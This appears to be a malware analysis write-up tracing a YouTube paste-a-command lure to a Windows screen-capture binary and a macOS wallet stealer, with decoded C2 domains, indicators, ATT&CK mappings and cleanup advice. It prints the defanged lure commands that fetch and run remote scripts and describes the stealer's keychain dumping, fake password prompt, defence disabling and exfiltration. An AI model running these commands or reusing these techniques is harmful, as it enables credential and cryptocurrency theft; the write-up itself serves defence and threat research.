@@ -1,0 +1,171 @@
+---
+title: From a YouTube video to two stealers
+kind: security
+year: "2026"
+order: 5
+status: Investigation
+summary: A YouTube video with 45k views pointed to a paste that served one command per OS. I followed both chains to the end. The macOS one is a wallet stealer with four C2 domains. The Windows one is a garbled Go binary that hides its API calls.
+why: Paste-a-command lures are now everywhere on YouTube, and most write-ups stop at the first script. I wanted to see what actually lands on the machine.
+note: Everything below is static analysis or emulation. Neither payload was ever executed, and I didn't contact the C2 servers during the analysis.
+stack: [Ghidra 12.1, REA, Unicorn, Capstone, LIEF, Python]
+results:
+  - value: "2"
+    label: infection chains, one per OS
+  - value: "4"
+    label: C2 domains decoded from the macOS config
+  - value: "203"
+    label: browser-extension IDs targeted, mostly wallets
+  - value: "39"
+    label: Windows APIs decrypted by emulating the string decryptor
+---
+
+## How it started
+
+A YouTube video with about 45,000 views (ID `3FyBGgkkjSw`), plus several other videos pointing to the same link. The description sends you to a Pastebin paste (`UthsJdis`) that offers one command per platform, presented as an "installer".
+
+| OS | What the paste tells you to run |
+| --- | --- |
+| Windows | `iwr "hxxp://soft-storage[.]top/worker?=7341210743/ai-plugin" -UseBasicParsing` |
+| macOS | a real `bun.sh/install` command, chained to `/bin/bash -c "$(curl -fsSL hxxp://192.162.199[.]249/9rmoz4cqi58)"` |
+
+The real Bun installer at the front is there to make the command look legitimate.
+
+## The two chains
+
+<Pipeline>
+  <Lane title="Windows">
+    <Stage label="paste" sub="iwr one-liner" />
+    <Stage label="soft-storage[.]top" sub="UA-gated .ps1 stager" />
+    <Stage label="193.148.56[.]147" sub="base64 PE" />
+    <Stage label="cmmd.exe" sub="garbled Go" />
+  </Lane>
+  <Lane title="macOS">
+    <Stage label="paste" sub="bun + curl | bash" />
+    <Stage label="192.162.199[.]249" sub="shell script" />
+    <Stage label="$TMPDIR" sub="xattr -c, chmod +x, run" />
+    <Stage label="Mach-O" sub="wallet stealer" />
+  </Lane>
+</Pipeline>
+
+### The Windows server checks your User-Agent
+
+Opening `soft-storage[.]top/worker` in a browser returns nothing, and so does plain `curl`. It only answers with the exact User-Agent that PowerShell 7 sends: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.5.0`. That cheap check keeps sandboxes and scanners that crawl the link from getting the payload.
+
+### The PowerShell stager
+
+The script it returns (`mal.ps1`) does this:
+
+1. Downloads a base64 blob from `hxxp://193.148.56[.]147/final_check?=7311907082/Unlim-api-plugin`, using a junk User-Agent (`SJSHDUWSJHIAO0WUI…`).
+2. If it is running as admin, it adds Defender exclusions for `C:\Windows\Temp`, `C:\` and `C:\ProgramData`. It also turns SmartScreen off through four registry values, runs `gpupdate /force`, and launches the payload elevated as `C:\ProgramData\cmmd.exe`. Otherwise it runs it as `%TEMP%\cmmd.exe`.
+3. Shows a fake `Checking 1%…100%` progress counter, then prints `Success | issues - 0!`.
+4. Clears the clipboard and the Windows clipboard history, wipes the PSReadLine history file, and stops further history from being saved. The command you pasted is gone.
+
+The base64 decodes byte-for-byte to the PE I analysed next (SHA-256 `85b6396c…20d7`).
+
+## Windows payload: garbled Go
+
+`cmmd.exe` is a 3 MB Go 1.23.1 binary built with [garble](https://github.com/burrowers/garble). Function names in `main` are random (`main.zkWN8Ho3NqlvPT`, `main.qssh2XqU`…). The only real name left is the source path, `SterlingSignalVentures/main.go`.
+
+**`main.main` hides in padding.** It decompiles to 13,000 lines. Ghidra failed on it at first with `Response buffer size exceeded`, until I raised the decompiler's 50 MB payload limit (`DecompileOptions.setMaxPayloadMBytes`). Around 2,000 of its calls are `runtime.printint` / `printstring` filler, plus a decoy table printer (`mills: … men: … three-sum: …`).
+
+**No readable API names.** The Windows APIs it uses are resolved at runtime through `LoadLibrary` and `GetProcAddress`. Their names come from a 39-entry table at `0x6c86c0`, where each name is encrypted with its own key. The decryptor (`main.qssh2XqU`) is control-flow flattened, so instead of reversing it, I emulated it.
+
+- I mapped the PE into Unicorn and gave it a fake goroutine in `R14`, so Go's stack check passes.
+- I stubbed the handful of runtime calls it needs (`mallocgc`, `makeslice`, `growslice`, `memmove`) with a bump allocator.
+- Then I called it once per table entry using Go's register ABI.
+
+All 78 calls (a DLL name and an API name per entry) came back clean:
+
+| DLL | APIs |
+| --- | --- |
+| user32 | `CreateDesktopW`, `OpenDesktopW`, `CloseDesktop`, `GetDC`, `GetWindowDC`, `GetWindowRect`, `GetSystemMetrics`, `EnumDisplaySettingsW`, `GetKeyboardLayout(NameA/W)` … |
+| gdi32 | `BitBlt`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `GetDIBits`, `SelectObject` … |
+| ole32 / oleaut32 | `CoInitializeSecurity`, `CoCreateInstance`, `CoSetProxyBlanket`, `SysAllocString`, `VariantClear` … |
+| kernel32 / advapi32 | `GetComputerNameExA`, `GetUserNameA`, `LookupPrivilegeValueW`, `ExitProcess` … |
+
+That set fits a hidden-desktop screen-capture tool. It creates its own desktop, screenshots it with GDI and collects host and user info. The COM security calls look like WMI queries. The keyboard-layout APIs are the usual "don't run in certain countries" check.
+
+<Note>What I could not close: no `main.*` function references networking APIs directly, and no other encrypted strings exist in the same format. Either the network layer goes through COM, or this build is one module of something larger. I'm leaving that open rather than guessing.</Note>
+
+## macOS payload: a wallet stealer with its config in the clear (after one XOR)
+
+`p7tp4i95c5x1fs96` is a universal Mach-O (x86_64 + arm64) written in C++. It is ad-hoc signed with the identifier `macos-stealer-v2-…`, so the authors at least named it honestly.
+
+### Strings: 128-bit XOR, built inline
+
+There are only 11 plain strings. Every other string is assembled on the stack from immediate values and XORed with a 128-bit key held in registers (`vpxor` / `vxorps`). Decompiling `main` took longer than ten minutes, so I took a cruder route. I swept every instruction in `__text` through Unicorn once, in address order, skipping calls and branches, and dumped `xmm` after each XOR. That gave 566 readable strings.
+
+### The config: one rotating XOR
+
+The C2 list wasn't in those strings. It sits in a 329-byte blob at the start of `__DATA,__data`. The blob starts with an 8-byte key, and the decoder XORs each byte with the key, rotating the key right by one bit per byte. Six lines of Python reproduce it, and both slices decode to the same config:
+
+- build tag `mrdor`
+- C2: `lewokodwqko[.]icu`, `shopguoerve[.]pro`, `dfsjfisafosdikfos[.]info`, `isosissisisossfiof[.]com` (all HTTPS)
+- files to grab: `txt md csv json doc docx xls xlsx pdf cfg kdbx`
+- password prompt: title `System Settings`, text `Please enter your password to continue`
+
+### What it does
+
+1. Runs `killall Terminal` to close the window you pasted into.
+2. Asks for your password with an `osascript display dialog … with hidden answer` prompt titled "System Settings". It checks the answer with `dscl . -authonly` and keeps asking until it is correct.
+3. Dumps `login.keychain-db` and reads the browsers' "Safe Storage" keys with `security find-generic-password -w`. That key plus PBKDF2 and AES (`CCKeyDerivationPBKDF` + `CCCrypt`) is how Chromium cookies and passwords are decrypted on macOS.
+4. Collects data from:
+   - **Chromium-family browsers:** Chrome, Brave, Edge, Arc, Opera, Vivaldi, Yandex, CocCoc. It takes cookies, Local Storage and IndexedDB, plus the `Local Extension Settings` of 203 extension IDs. I matched MetaMask, Phantom, Trust, Coinbase Wallet, Binance Chain, TronLink and the Bitwarden password manager by hand.
+   - **Other browsers and apps:** Firefox, Safari `Cookies.binarycookies`, Apple Notes `NoteStore.sqlite`, Telegram `tdata` and Discord tokens.
+   - **Wallets:** Electrum, Exodus, Atomic, Wasabi, Monero, Bitcoin/Litecoin/Dash/Dogecoin Core, Guarda, Binance and TonKeeper.
+5. Uses a Finder AppleScript to copy matching documents from Desktop, Documents and Downloads, up to a size limit.
+6. Zips everything with `ditto -c -k` and uploads it with `curl --fail -X POST`.
+7. **Replaces Ledger Live and Trezor Suite.** It downloads a zip, runs `xattr -c` to clear quarantine, kills the real app and unzips the replacement into `/Applications`. The next time the victim opens their hardware-wallet app, it's the attacker's build.
+8. **Persists.** It downloads an agent to `~/.hlpr/.agnt` and installs `~/Library/LaunchAgents/com.hlpr.agent.plist` with `RunAtLoad` and `KeepAlive`. It also turns on Do Not Disturb so no notification gives it away.
+
+This matches what has been publicly reported about the AMOS / Atomic-stealer family: dialog phishing checked with `dscl`, a long wallet list, and more recently trojanised Ledger and Trezor apps and a persistent agent. I'm calling it "AMOS-like" because I have no family-level signature to confirm it.
+
+## Indicators
+
+| Type | Value |
+| --- | --- |
+| Lure | YouTube `3FyBGgkkjSw`, Pastebin `UthsJdis` |
+| URL | `hxxp://soft-storage[.]top/worker?=7341210743/ai-plugin` |
+| URL | `hxxp://193.148.56[.]147/final_check?=7311907082/Unlim-api-plugin` |
+| URL | `hxxp://192.162.199[.]249/9rmoz4cqi58`, `/p7tp4i95c5x1fs96` |
+| C2 | `lewokodwqko[.]icu`, `shopguoerve[.]pro`, `dfsjfisafosdikfos[.]info`, `isosissisisossfiof[.]com` |
+| UA | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.5.0` (gate) |
+| File | `%TEMP%\cmmd.exe`, `C:\ProgramData\cmmd.exe` |
+| File | `~/.hlpr/`, `~/Library/LaunchAgents/com.hlpr.agent.plist` |
+| SHA-256 | `ec1797ad0d54252df1cb57dfd4bb6ee9b74d71b991dcd4a8084e66638f087f31` (stager .ps1) |
+| SHA-256 | `85b6396c8af397f659ec0ff75df40bb3b8fdea7301a6d259745dffd65c1e20d7` (cmmd.exe) |
+| SHA-256 | `24920ac8165a30fbff61cb0ce77bb50aa7bc389305d381c4485b9d75bc1ad594` (macOS Mach-O) |
+
+## ATT&CK
+
+| ID | Technique | Where |
+| --- | --- | --- |
+| T1204.004 | User Execution: Malicious Copy and Paste | the paste |
+| T1059.001 / T1059.004 | PowerShell / Unix shell | both stagers |
+| T1562.001 | Impair Defenses | Defender exclusions, SmartScreen off |
+| T1070.003 | Clear Command History | PSReadLine, clipboard history |
+| T1027.013 | Encrypted/Encoded File | garble, XOR strings, rotating-XOR config |
+| T1106 | Native API | runtime `GetProcAddress` table |
+| T1564.003 | Hidden Window (hidden desktop) | `CreateDesktopW` + GDI capture |
+| T1056.002 | GUI Input Capture | fake "System Settings" password dialog |
+| T1555.001 | Keychain | `login.keychain-db`, Safe Storage keys |
+| T1539 | Steal Web Session Cookie | browser cookie stores |
+| T1005 | Data from Local System | Finder file grabber, wallets, Notes |
+| T1554 | Compromise Host Software Binary | trojanised Ledger Live / Trezor Suite |
+| T1543.001 | Launch Agent | `com.hlpr.agent` |
+| T1041 | Exfiltration Over C2 Channel | `curl -X POST` |
+
+## Results
+
+<Results />
+
+## If you ran one of these
+
+- **macOS:**
+  - Remove `~/Library/LaunchAgents/com.hlpr.agent.plist` and `~/.hlpr/`.
+  - Delete Ledger Live and Trezor Suite, then reinstall them from the vendors' sites.
+  - Treat your login password, the keychain, every browser session and every wallet seed as stolen. Move funds from a clean machine.
+- **Windows:**
+  - Remove `cmmd.exe`.
+  - Remove the Defender exclusions and undo the SmartScreen registry changes.
+  - Rotate browser credentials from a clean device.
